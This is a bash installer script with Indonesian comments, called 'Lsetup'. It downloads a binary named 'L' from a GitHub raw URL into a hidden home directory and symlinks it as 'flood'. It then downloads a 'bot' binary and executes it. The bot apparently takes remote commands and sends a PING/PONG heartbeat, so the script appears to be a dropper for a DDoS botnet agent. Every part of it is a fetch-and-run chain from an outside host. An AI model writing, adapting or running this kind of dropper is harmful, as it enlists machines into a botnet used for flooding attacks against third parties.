#!/usr/bin/env bash
# ==============================================================================
# Lsetup — custom bot: download biner L, chmod, lalu run bot (foreground).
# Bot versi ini punya debug: "[+] Command masuk: ..." dan heartbeat PING/PONG.
# ==============================================================================
set -e

REPO_BASE="https://raw.githubusercontent.com/risalmuhammd66-byte/agent/main"
TARGET_DIR="${HOME}/.lsetup"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

mkdir -p "${TARGET_DIR}"
cd "${TARGET_DIR}"

download_file() {
    URL="$1"
    DEST="$2"
    if command -v curl >/dev/null 2>&1; then
        curl -fsSL "${URL}?t=$(date +%s)" -o "${DEST}"
    elif command -v wget >/dev/null 2>&1; then
        wget -q "${URL}?t=$(date +%s)" -O "${DEST}"
    else
        return 1
    fi
}

echo "=================================================="
echo "            Initializing Lsetup                   "
echo "=================================================="

# ---- biner L (disimpan sebagai ./L + symlink ./flood) ----
L_OK=0
echo "[*] Download biner L (statik) dari repo..."
if download_file "${REPO_BASE}/Lsetup/L" "./L" && [ -s "./L" ] && [ -x "./L" ] || [ -s "./L" ]; then
    L_OK=1
fi
if [ "${L_OK}" -eq 0 ] && [ -f "${SCRIPT_DIR}/L" ]; then
    echo "[!] Download gagal, pakai biner L lokal..."
    cp -f "${SCRIPT_DIR}/L" "./L" && L_OK=1
fi

chmod +x "./L" 2>/dev/null || true
ln -sf "./L" "./flood" 2>/dev/null || cp -f "./L" "./flood"
chmod +x "./flood" 2>/dev/null || true
echo "[+] Biner L siap: $(ls -la ./L | awk '{print $5}') bytes"

if [ ! -x ./L ]; then
    echo "[!] biner L gagal didapat. Aborting."
    exit 1
fi

# ---- bot biner ----
BOT_OK=0
echo "[*] Download biner bot..."
if download_file "${REPO_BASE}/Lsetup/bot" "./bot" && [ -s "./bot" ]; then
    BOT_OK=1
fi
if [ "${BOT_OK}" -eq 0 ] && [ -f "${SCRIPT_DIR}/bot" ]; then
    echo "[!] Download bot gagal, pakai biner bot lokal..."
    cp -f "${SCRIPT_DIR}/bot" "./bot" && BOT_OK=1
fi
chmod +x "./bot" 2>/dev/null || true

if [ ! -x ./bot ]; then
    echo "[!] biner bot gagal didapat. Aborting."
    exit 1
fi

echo "[+] Menjalankan bot (debug: command masuk + heartbeat)..."
echo "=================================================="
exec ./bot